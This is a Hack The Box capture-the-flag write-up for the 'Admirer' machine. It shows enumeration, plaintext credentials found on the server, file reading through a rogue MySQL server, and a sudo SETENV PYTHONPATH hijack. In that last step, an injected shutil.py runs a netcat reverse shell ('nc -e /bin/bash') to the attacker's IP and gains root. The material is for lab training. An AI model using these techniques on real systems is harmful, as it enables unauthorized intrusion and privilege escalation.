---
layout: single
title: Admirer - Hack The Box
excerpt: "Admirer is an easy box with the typical 'gobuster/find creds on the webserver' part, but after we use a Rogue MySQL server to read files from the server file system, then for privesc there's a cool sudo trick with environment variables so we can hijack the python library path and get RCE as root."
date: 2020-09-26
classes: wide
header:
  teaser: /assets/images/htb-writeup-admirer/admirer_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - plaintext creds
  - gobuster
  - ftp
  - rogue mysql
  - python
  - sudo
  - setenv  
---

![](/assets/images/htb-writeup-admirer/admirer_logo.png)

Admirer is an easy box with the typical 'gobuster/find creds on the webserver' part, but after we use a Rogue MySQL server to read files from the server file system, then for privesc there's a cool sudo trick with environment variables so we can hijack the python library path and get RCE as root.

## Portscan

```
# nmap -sC -sV -p- 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-02 18:23 EDT
Nmap scan report for admirer.htb (10.10.10.187)
Host is up (0.019s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.09 seconds
```

## FTP

Anonymous access is not enabled and I don't know of any public exploit for this version of vsFTPd.

```
root@kali:~/htb/admirer# ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:root): anonymous
530 Permission denied.
Login failed.
```

## Website

The website has a bunch of pictures but nothing else interesting. The about link with the contact form at the bottom of the page is not functional.

![](/assets/images/htb-writeup-admirer/image-20200502182528416.png)

From the nmap scan, we already picked up the content of `robots.txt`, so I know there's an `/admin-dir` directory but I don't have access to it (Forbidden error.

From the gobuster scan, I pick up two files:

```
root@kali:~/htb/admirer# gobuster dir -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x txt -u http://admirer.htb/admin-dir
[...]
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
```

The `contacts.txt` file contains a bunch of email addresses:

```
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

The `credentials.txt` file contains some credentials for email, ftp and wordpress accounts:

```
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

## Source files

Using the `ftpuser` credentials obtained from the credential file, I found a SQL dump file and an archive that contains the source files of the website.

```
root@kali:~/htb/admirer# ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02 21:24 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03 21:20 html.tar.gz
226 Directory send OK.
```

After unpacking, we have the source code and some directories like `utility-scripts` and `w4ld0s_s3cr3t_d1r`:

```
assets  html.tar.gz  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r
```

Analysing the source files, I found the following creds:

**index.php**

```
$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";
```

**db_admin.php**

```
$servername = "localhost";
$username = "waldo";
$password = "Wh3r3_1s_w4ld0?";
```

On the production server I can't find the **db_admin.php** file so I re-ran gobuster in the **/utility-scripts** directory and found an additional file.

```
root@kali:~/htb/admirer# gobuster dir -w ~/tools/SecLists/Discovery/Web-Content/big.txt -x txt,php -u http://admirer.htb/utility-scripts
[...]
/adminer.php (Status: 200)
/info.php (Status: 200)
/phptest.php (Status: 200)
```

## Reading files through Adminer

![](/assets/images/htb-writeup-admirer/image-20200502184553525.png)

I can connect to any server using the interface so by using a [rogue MySQL server](https://github.com/allyshka/Rogue-MySql-Server) running on my VM I was able to read files from the target system. I read `/var/www/html/index.php` and obtained the real DB password running on the target system.

```
$servername = "localhost";\n
$username = "waldo";\n
$password = "&<h5b~yK3F#{PaPB&dA}{H>";\n
$dbname = "admirerdb";\n\n
// Create connection\n
$conn = new mysqli($servername, $username, $password, $dbname);\n
```

I can log in with SSH with the **waldo** username:

```
root@kali:~/htb/admirer# ssh waldo@10.10.10.187
waldo@10.10.10.187's password: 
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Sat May  2 23:04:06 2020 from 10.10.14.26
waldo@admirer:~$ cat user.txt
f6fc72bf41c41ed65d4ca1e95ef76dbe
```

## Privesc

Waldo can run `/opt/scripts/admin_tasks.sh` as any user. The sudo command is configured to accept environment variables (SETENV).

```
waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

In `/var/tmp/snow` I'll copy shutil.py, add a system call to execute netcat then hijack the library import by setting the PYTHONVARIABLE to this directory.

```python
def make_archive(base_name, format, root_dir=None, base_dir=None, verbose=0,
                 dry_run=0, owner=None, group=None, logger=None):
[...]

    os.system("/bin/nc -e /bin/bash 10.10.14.22 443")
    save_cwd = os.getcwd()
```

Execution:

```
waldo@admirer:/var/tmp/snow$ sudo -E PYTHONPATH=/var/tmp/snow /opt/scripts/admin_tasks.sh

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
```

Shell:

```
root@kali:~/htb/admirer# rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.10.187] 40322
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
f24b1746556cc00321b58a6f6842bed7
```

